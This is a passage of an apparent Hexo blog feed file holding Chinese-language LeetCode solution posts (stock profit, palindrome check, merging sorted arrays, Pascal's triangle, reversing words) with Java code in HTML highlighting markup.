class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> r = <span class="number">0</span>, c = <span class="number">0</span>, di = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; R * C; i++) &#123;</span><br><span class="line">            ans.add(matrix[r][c]);</span><br><span class="line">            seen[r][c] = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">int</span> cr = r + dr[di];</span><br><span class="line">            <span class="keyword">int</span> cc = c + dc[di];</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt;= cr &amp;&amp; cr &lt; R &amp;&amp; <span class="number">0</span> &lt;= cc &amp;&amp; cc &lt; C &amp;&amp; !seen[cr][cc])&#123;</span><br><span class="line">                r = cr;</span><br><span class="line">                c = cc;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                di = (di + <span class="number">1</span>) % <span class="number">4</span>;</span><br><span class="line">                r += dr[di];</span><br><span class="line">                c += dc[di];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/spiral-matrix/solution/luo-xuan-ju-zhen-by-leetcode/" target="_blank" rel="noopener">LeetCode-螺旋矩阵-题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>121. 买卖股票的最佳时机</title>
    <url>/2020/03/27/LeetCode/leetcode-000121-%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p>
<p>如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。</p>
<p>注意：你不能在买入股票前卖出股票。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [7,1,5,3,6,4]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 在第 2 天（股票价格 &#x3D; 1）的时候买入，在第 5 天（股票价格 &#x3D; 6）的时候卖出，最大利润 &#x3D; 6-1 &#x3D; 5 。</span><br><span class="line">     注意利润不能是 7-1 &#x3D; 6, 因为卖出价格需要大于买入价格。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [7,6,4,3,1]</span><br><span class="line">输出: 0</span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</span><br></pre></td></tr></table></figure>

<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一：暴力计算"><a href="#解法一：暴力计算" class="headerlink" title="解法一：暴力计算"></a>解法一：暴力计算</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; prices.length;i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; prices.length;j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (prices[j] - prices[i] &gt; max) &#123;</span><br><span class="line">					max = prices[j] - prices[i];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：遍历"><a href="#解法二：遍历" class="headerlink" title="解法二：遍历"></a>解法二：遍历</h3><p>我们可以把数组按照递增区间最小值分为几个部分。</p>
<p>比如针对数组[7,1,5,3,6,4]就可以分为[7]和[1,5,3,6,4]这两个部分，然后在这两个部分中分别求最大的差值。</p>
<p>为什么这么分呢？</p>
<p>获取最大利益，都是想在最低点买入，最高点卖出，那么是不是可以这么考虑，只要某段区间内，最小值没有变化的话，就找到这个区间里面的最大值，两者相减，获得区间最大值，最后和其他区间的最大值比较，取最大的就行了呢？</p>
<p>而数组[7,1,5,3,6,4]，第一个最小值就是7，最小值min初始化为Integer.MAX_VALUE。第二个就是1.因此分为[7]和[1,5,3,6,4]两部分。</p>
<p>而数组[2,5,1,3]就可以分为[2,5]和[1,3]两个部分，因为最小值从2变为了1.</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> prices[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> minprice = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; minprice)</span><br><span class="line">                minprice = prices[i];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (prices[i] - minprice &gt; maxprofit)</span><br><span class="line">                maxprofit = prices[i] - minprice;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：最大子数组和"><a href="#解法三：最大子数组和" class="headerlink" title="解法三：最大子数组和"></a>解法三：最大子数组和</h3><p>股票从买入的那天起，到卖出的那天，所收获的利益就是p[i]-p[i-1] + p[i-1]-p[i-2] + … + p[2] - p[1]。</p>
<p>那么这个问题就可以转化为求最大子数组和的问题。</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> len = prices.length;</span><br><span class="line">		<span class="keyword">if</span> (len &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> res = <span class="number">0</span>, currsum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (currsum &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">				currsum = prices[i] - prices[i - <span class="number">1</span>];</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				currsum += prices[i] - prices[i - <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (currsum &gt; res) &#123;</span><br><span class="line">				res = currsum;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>125. 验证回文串</title>
    <url>/2020/03/27/LeetCode/leetcode-000125-%E9%AA%8C%E8%AF%81%E5%9B%9E%E6%96%87%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串，验证它是否是回文串，只考虑字母和数字字符，可以忽略字母的大小写。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本题中，我们将空字符串定义为有效的回文串。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"A man, a plan, a canal: Panama"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"race a car"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>你可以假设字符串只包含小写字母。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：双指针"><a href="#解法一：双指针" class="headerlink" title="解法一：双指针"></a>解法一：双指针</h3><p>首尾遍历，遇到非字符的跳过，然后判断是否相等</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> boolean <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s == null || s.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r = s.length()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!isValid(s.charAt(l))) &#123;</span><br><span class="line">                l++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!isValid(s.charAt(r))) &#123;</span><br><span class="line">                r--;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!isSame(s.charAt(l), s.charAt(r))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> boolean <span class="title">isValid</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(c &gt;= <span class="string">'a'</span> &amp;&amp; c &lt;= <span class="string">'z'</span> || c &gt;= <span class="string">'A'</span> &amp;&amp; c &lt;= <span class="string">'Z'</span> || c &gt;= <span class="string">'0'</span> &amp;&amp; c &lt;= <span class="string">'9'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> boolean <span class="title">isSame</span><span class="params">(<span class="keyword">char</span> c1, <span class="keyword">char</span> c2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(c1 &gt;= <span class="string">'A'</span> &amp;&amp; c1 &lt;= <span class="string">'Z'</span>) &#123;</span><br><span class="line">            c1 = (<span class="keyword">char</span>)(c1 - <span class="string">'A'</span> + <span class="string">'a'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(c2 &gt;= <span class="string">'A'</span> &amp;&amp; c2 &lt;= <span class="string">'Z'</span>) &#123;</span><br><span class="line">            c2 = (<span class="keyword">char</span>)(c2 - <span class="string">'A'</span> + <span class="string">'a'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c1 == c2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：库函数"><a href="#解法二：库函数" class="headerlink" title="解法二：库函数"></a>解法二：库函数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        String str = s.toLowerCase();</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c : str.toCharArray())&#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.isLetterOrDigit(c))    sb.append(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString().equals(sb.reverse().toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>88. 合并两个有序数组</title>
    <url>/2020/03/27/LeetCode/leetcode-000088-%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你两个有序整数数组 <em>nums1</em> 和 <em>nums2*，请你将 *nums2</em> 合并到 <em>nums1</em> 中<em>，</em>使 <em>num1</em> 成为一个有序数组。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>初始化 nums1 和 nums2 的元素数量分别为 m 和 n 。<br>你可以假设 nums1 有足够的空间（空间大小大于或等于 m + n）来保存 nums2 中的元素。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">nums1 &#x3D; [1,2,3,0,0,0], m &#x3D; 3</span><br><span class="line">nums2 &#x3D; [2,5,6],       n &#x3D; 3</span><br><span class="line"></span><br><span class="line">输出: [1,2,2,3,5,6]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：从数组的最后开始合并"><a href="#解法一：从数组的最后开始合并" class="headerlink" title="解法一：从数组的最后开始合并"></a>解法一：从数组的最后开始合并</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = m - <span class="number">1</span>, j = n - <span class="number">1</span>, k = m + n - <span class="number">1</span>;k &gt;= <span class="number">0</span>;k--) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i &gt;= <span class="number">0</span> &amp;&amp; (j &lt; <span class="number">0</span> || nums1[i] &gt; nums2[j] )) &#123;</span><br><span class="line">				nums1[k] = nums1[i--];</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				nums1[k] = nums2[j--];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：合并数组，排序"><a href="#解法二：合并数组，排序" class="headerlink" title="解法二：合并数组，排序"></a>解法二：合并数组，排序</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    System.arraycopy(nums2, <span class="number">0</span>, nums1, m, n);</span><br><span class="line">    Arrays.sort(nums1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：从数组的前面开始合并"><a href="#解法三：从数组的前面开始合并" class="headerlink" title="解法三：从数组的前面开始合并"></a>解法三：从数组的前面开始合并</h3><p>因为nums1是要作为结果数组的，所以，需要把nums1的前m项先另存起来。</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Make a copy of nums1.</span></span><br><span class="line">    <span class="keyword">int</span> [] nums1_copy = <span class="keyword">new</span> <span class="keyword">int</span>[m];</span><br><span class="line">    System.arraycopy(nums1, <span class="number">0</span>, nums1_copy, <span class="number">0</span>, m);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Two get pointers for nums1_copy and nums2.</span></span><br><span class="line">    <span class="keyword">int</span> p1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> p2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set pointer for nums1</span></span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Compare elements from nums1_copy and nums2</span></span><br><span class="line">    <span class="comment">// and add the smallest one into nums1.</span></span><br><span class="line">    <span class="keyword">while</span> ((p1 &lt; m) &amp;&amp; (p2 &lt; n))</span><br><span class="line">      nums1[p++] = (nums1_copy[p1] &lt; nums2[p2]) ? nums1_copy[p1++] : nums2[p2++];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if there are still elements to add</span></span><br><span class="line">    <span class="keyword">if</span> (p1 &lt; m)</span><br><span class="line">      System.arraycopy(nums1_copy, p1, nums1, p1 + p2, m + n - p1 - p2);</span><br><span class="line">    <span class="keyword">if</span> (p2 &lt; n)</span><br><span class="line">      System.arraycopy(nums2, p2, nums1, p1 + p2, m + n - p1 - p2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>119. 杨辉三角 II</title>
    <url>/2020/03/27/LeetCode/leetcode-000119-%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负索引 <em>k</em>，其中 <em>k</em> ≤ 33，返回杨辉三角的第 <em>k</em> 行。</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/PascalTriangleAnimated2.gif" alt="杨辉三角"></p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">3</span></span><br><span class="line">输出: [<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><p>你可以优化你的算法到 <em>O</em>(<em>k</em>) 空间复杂度吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：迭代法"><a href="#解法一：迭代法" class="headerlink" title="解法一：迭代法"></a>解法一：迭代法</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">		List&lt;Integer&gt; first = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		List&lt;Integer&gt; second = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= rowIndex;i++) &#123;</span><br><span class="line">			first = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt;= i;j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="number">0</span> == j || j == i) &#123;</span><br><span class="line">					first.add(<span class="number">1</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					first.add(second.get(j - <span class="number">1</span>) + second.get(j));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			second = first;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>151. 翻转字符串里的单词</title>
    <url>/2020/03/27/LeetCode/leetcode-000151-%E7%BF%BB%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%87%8C%E7%9A%84%E5%8D%95%E8%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串，逐个翻转字符串中的每个单词。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"the sky is blue"</span></span><br><span class="line">输出: <span class="string">"blue is sky the"</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"  hello world!  "</span></span><br><span class="line">输出: <span class="string">"world! hello"</span></span><br><span class="line">解释: 输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"a good   example"</span></span><br><span class="line">输出: <span class="string">"example good a"</span></span><br><span class="line">解释: 如果两个单词间有多余的空格，将反转后单词间的空格减少到只含一个。</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>无空格字符构成一个单词。</li>
<li>输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。</li>
<li>如果两个单词间有多余的空格，将反转后单词间的空格减少到只含一个。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>正则表达式+字符串拼接</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		s = s.replaceAll(<span class="string">"\\s+"</span>, <span class="string">" "</span>).trim();</span><br><span class="line">		</span><br><span class="line">		String[] ss = s.split(<span class="string">" "</span>);</span><br><span class="line">		</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = ss.length - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">			sb.append(ss[i]).append(<span class="string">" "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString().trim();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：解法一优化"><a href="#解法二：解法一优化" class="headerlink" title="解法二：解法一优化"></a>解法二：解法一优化</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// remove leading spaces</span></span><br><span class="line">    s = s.trim();</span><br><span class="line">    <span class="comment">// split by multiple spaces</span></span><br><span class="line">    List&lt;String&gt; wordList = Arrays.asList(s.split(<span class="string">"\\s+"</span>));</span><br><span class="line">    Collections.reverse(wordList);</span><br><span class="line">    <span class="keyword">return</span> String.join(<span class="string">" "</span>, wordList);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：翻转字符串"><a href="#解法三：翻转字符串" class="headerlink" title="解法三：翻转字符串"></a>解法三：翻转字符串</h3><p>先翻转整个字符串，再翻转每个单词</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> StringBuilder <span class="title">trimSpaces</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = s.length() - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// remove leading spaces</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right &amp;&amp; s.charAt(left) == <span class="string">' '</span>) ++left;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// remove trailing spaces</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right &amp;&amp; s.charAt(right) == <span class="string">' '</span>) --right;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduce multiple spaces to single one</span></span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">      <span class="keyword">char</span> c = s.charAt(left);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (c != <span class="string">' '</span>) sb.append(c);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (sb.charAt(sb.length() - <span class="number">1</span>) != <span class="string">' '</span>) sb.append(c);</span><br><span class="line"></span><br><span class="line">      ++left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(StringBuilder sb, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">      <span class="keyword">char</span> tmp = sb.charAt(left);</span><br><span class="line">      sb.setCharAt(left++, sb.charAt(right));</span><br><span class="line">      sb.setCharAt(right--, tmp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseEachWord</span><span class="params">(StringBuilder sb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = sb.length();</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (start &lt; n) &#123;</span><br><span class="line">      <span class="comment">// go to the end of the word</span></span><br><span class="line">      <span class="keyword">while</span> (end &lt; n &amp;&amp; sb.charAt(end) != <span class="string">' '</span>) ++end;</span><br><span class="line">      <span class="comment">// reverse the word</span></span><br><span class="line">      reverse(sb, start, end - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// move to the next word</span></span><br><span class="line">      start = end + <span class="number">1</span>;</span><br><span class="line">      ++end;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// converst string to string builder </span></span><br><span class="line">    <span class="comment">// and trim spaces at the same time</span></span><br><span class="line">    StringBuilder sb = trimSpaces(s);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reverse the whole string</span></span><br><span class="line">    reverse(sb, <span class="number">0</span>, sb.length() - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reverse each word</span></span><br><span class="line">    reverseEachWord(sb);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

